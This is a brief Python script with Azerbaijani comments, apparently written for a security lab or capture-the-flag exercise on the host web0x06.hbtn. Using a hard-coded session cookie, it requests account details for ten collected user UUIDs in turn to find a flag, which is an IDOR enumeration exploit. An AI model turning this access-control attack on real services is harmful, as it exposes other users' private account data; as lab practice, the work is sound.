import requests
import json

BASE_URL = "http://web0x06.hbtn"
SESSION_COOKIE = "qRLkiBt9HEL10byv5ppUKKQHJhhINrd-MlJVojZ3A10.WqjE12TJeZuH-5vqK6mbtoA4fWc"

# Əvvəlki addımlarda tapdığımız bütün Account UUID-ləri
account_uuids = [
    "5c501a65617c4c54991a66ddb0876fcb", # Robert
    "8192d30610044eed875bceb577b39e21", # Robert
    "a1f57e1698414de3811f98aa0134d54a", # Linda
    "401cc80de1af4a58963bf331560946c6", # Patricia
    "b0ee716e8bd74ac08555cd688ab1c5e6", # Elizabeth
    "51bf0d5a7800415ab46cbc1549ee3a48", # Elizabeth
    "c2da6aae5b4847128da715a355c84ade", # Megan
    "9339d507deb749d48d4f9627a0164238", # Megan
    "6fc1138b054b4ad5800031b6710f8833", # Ashley
    "42c65adbeb024bada4cc9cd85795fc10"  # Ashley
]

cookies = {'session': SESSION_COOKIE}

print("--- [HÜCUM] UUID-lər Yeni Endpoint-də Yoxlanılır ---\n")

for uuid in account_uuids:
    # Sənin tapdığın 200 verən URL strukturu
    url = f"{BASE_URL}/api/accounts/info/{uuid}"
    
    res = requests.get(url, cookies=cookies)
    
    if res.status_code == 200:
        data = res.json()
        if "flag" in json.dumps(data).lower():
            print("\n" + "="*50)
            print("!!! BİNGO! BAYRAQ TAPILDI !!!")
            print(json.dumps(data, indent=4))
            print("="*50 + "\n")
            break
        else:
            print(f"[-] UUID {uuid[:8]}... yoxlanıldı: Bayraq yoxdur.")
    else:
        print(f"[X] Xəta! UUID {uuid[:8]}... | Status: {res.status_code}")

print("\nAxtarış tamamlandı.")
